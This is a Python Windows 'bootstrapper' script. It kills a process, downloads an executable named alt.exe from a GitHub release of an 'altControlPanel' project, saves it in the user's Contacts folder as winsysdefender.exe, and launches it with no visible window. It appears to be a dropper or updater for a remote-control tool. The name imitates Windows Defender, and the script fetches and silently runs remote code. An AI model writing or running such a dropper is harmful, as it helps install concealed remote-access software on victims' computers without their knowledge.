import os
import requests
import subprocess
import time
import platform
import sys
import socket

if platform.system() != "Windows":
    sys.stderr.write("bootstrapper.py can only run on Windows.\n")
    sys.exit(0)

# === CONFIGURATION ===
CONTACTS_DIR = os.path.join(os.path.expanduser("~"), "Contacts")
DEST_PATH = os.path.join(CONTACTS_DIR, "winsysdefender.exe")
DOWNLOAD_URL = "https://github.com/FalconTheBerd/altControlPanel/releases/download/v1.x/alt.exe"

def wait_for_port_close(port=5000, timeout=30):
    print(f"[INFO] Waiting for port {port} to close...")
    start = time.time()
    while time.time() - start < timeout:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex(("127.0.0.1", port)) != 0:
                print(f"[INFO] Port {port} is now free.")
                return True
        time.sleep(1)
    print(f"[WARN] Timeout: Port {port} still in use.")
    return False

def replace_and_restart():
    try:
        print("[INFO] Killing winsysdefender.exe...")
        os.system("taskkill /f /im winsysdefender.exe >nul 2>&1")

        tmp_path = DEST_PATH + ".new"
        print("[INFO] Downloading alt.exe from GitHub...")
        r = requests.get(DOWNLOAD_URL)
        if r.status_code != 200:
            print(f"[ERROR] Download failed: HTTP {r.status_code}")
            return

        os.makedirs(CONTACTS_DIR, exist_ok=True)
        with open(tmp_path, "wb") as f:
            f.write(r.content)

        print("[INFO] Replacing winsysdefender.exe...")
        os.replace(tmp_path, DEST_PATH)

        if wait_for_port_close(5000, timeout=30):
            print("[INFO] Launching winsysdefender.exe...")
            subprocess.Popen([DEST_PATH], creationflags=subprocess.CREATE_NO_WINDOW)
            print("[INFO] Done.")
        else:
            print("[WARN] Could not launch: Port 5000 still in use.")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == '__main__':
    replace_and_restart()